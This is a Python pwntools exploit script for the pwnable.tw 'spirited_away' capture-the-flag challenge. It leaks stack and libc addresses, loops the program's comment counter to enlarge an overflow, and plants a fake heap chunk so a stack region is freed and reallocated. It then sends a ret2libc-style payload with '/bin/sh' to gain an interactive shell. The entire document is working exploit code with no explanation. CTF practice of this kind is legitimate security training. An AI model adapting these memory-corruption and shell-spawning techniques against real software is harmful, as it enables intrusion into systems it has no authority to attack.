from pwn import *
context.arch = 'i386'
context.os = 'linux'
io = process(['./spirited_away'], env={"LD_LIBRARY_PATH":"/ctf/pwnable/spirit_away/"})
#io = remote('127.0.0.1', 4000)
#io = remote('chall.pwnable.tw', 10204)

io.recvuntil('name: ')
io.send('a'*0x3c)

io.recvuntil('age: ')
io.sendline('+')

io.recvuntil('? ')
io.send('a'*0x4f+'b')

io.recvuntil('comment: ')
io.send('a'*0x3c)


io.recvuntil('Reason: ')
io.recvuntil('b')
s = io.recvline()
stack = u32(s[:4])
libc_base = u32(s[8:12]) - 0x1b2d60 # 0x1b2d60
print('stack :' + hex(stack))
print('libc :' + hex(libc_base))

io.recvuntil('>: ')
io.send('Y')

for i in range(2, 11):
    io.sendafter('name: ', 'a'*0x3c)
    io.sendlineafter('age: ', '+')
    io.sendafter('? ', 'a'*0x50)
    io.sendafter('comment: ', 'a'*0x3c)
    io.sendafter('>: ', 'Y')
    print(i)

for i in range(11, 101):
    io.sendlineafter('age: ', '+')
    io.sendafter('?', 'a'*0x50)
    io.sendafter('>: ', 'Y')
    print(i)

target = stack - 0x68
io.sendafter('name: ', 'a'*0x3c)
io.sendlineafter('age: ', '+')
io.sendafter('? ', 'aaaa' + p32(0x41) + 'bbbb'*15 + p32(0x11))
io.sendafter('comment: ', 'xxxx'*21 + p32(target))
raw_input('gdb')
io.sendafter('>: ', 'Y')

system = libc_base + 0x3a940
puts = 0x80484a0
ret = 0x8048909
io.sendafter('name: ', '/bin/sh\x00' + 'xxxx'*16 + p32(stack) + p32(puts) + p32(stack-0x68) + p32(stack-0x68) )
#io.sendafter('name: ', p32(puts)*27)
io.sendlineafter('age: ', '+')
io.sendafter('? ', '0')
io.sendafter('comment: ', '0')
raw_input('gdb')
io.sendafter('>: ', 'N')

#raw_input('gdb')
io.interactive()

